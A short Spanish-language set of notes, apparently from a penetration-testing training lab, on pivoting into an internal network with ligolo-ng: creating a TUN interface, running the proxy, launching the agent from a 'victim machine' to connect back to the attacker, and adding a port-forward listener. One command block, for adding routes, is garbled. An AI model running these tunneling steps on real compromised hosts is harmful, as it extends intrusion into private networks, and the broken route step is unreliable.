w### Crear interfaz de red
creamos la interfaz de red que usaremos para configurar el proxy:
```
bash$ > sudo ip tuntap add user $USER mode tun ligolo
```

A su ves, tenemos que levantar la interfaz de red para que este operativa:
```
bash$ > sudo ip link set ligolo up
```
---------
### Añadimos las rutas
Usamos el siguiente comando para añadir el segmento de red:
```
bash$ >us.
```
---------
### Corremos ligolo
El siguiente comando inicia ligolo y agregamos una bandera para que ignore certificado(todo esto desde nuestra maquina):
```
bash$ > ./proxy -selfcert
```

Desde la maquina victima vamos a correr el Agente de la siguiente manera:
```
bash$ > ./agent -connect <nuestra-ip>:<puerto-ligolo> -ignore-cert
```
-------
### Iniciar el tuneleo
Una vez hecho lo anterior, desde nuestra maquina vamos a recibir un mensaje de que un nuevo agente se ha unido, es aqui cuando tenemos que ejecutar los siguientes comandos:
```
ligolo-ng » session
? Specify a session : 1 - www-data@inlanefreight.local - 10.129.201.127:48280
[Agent : rijaba@WebServer] >> start
```

### Port Forwarding
Haciendo la anterior ya tendriamos conectividad con el segmento de red que de antes no alcanzabamos, pero, ellos a nosotros no, lo que podemos hacer para que esto sea posible es hacer un port forwarding:
```
[Agent : rijaba@WebServer] >> listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80
```

Podemos ver la lista de listenners  :
```
[Agent : www-data@inlanefreight.local] » listener_list
┌────────────────────────────────────────────────────────────────────────────────────┐
│ Active listeners                                                                   │
├───┬──────────────────────────────┬────────────────────────┬────────────────────────┤
│ # │ AGENT                        │ AGENT LISTENER ADDRESS │ PROXY REDIRECT ADDRESS │
├───┼──────────────────────────────┼────────────────────────┼────────────────────────┤
│ 0 │ www-data@inlanefreight.local │ 0.0.0.0:8080           │ 127.0.0.1:80           │
└───┴──────────────────────────────┴────────────────────────┴────────────────────────┘
```
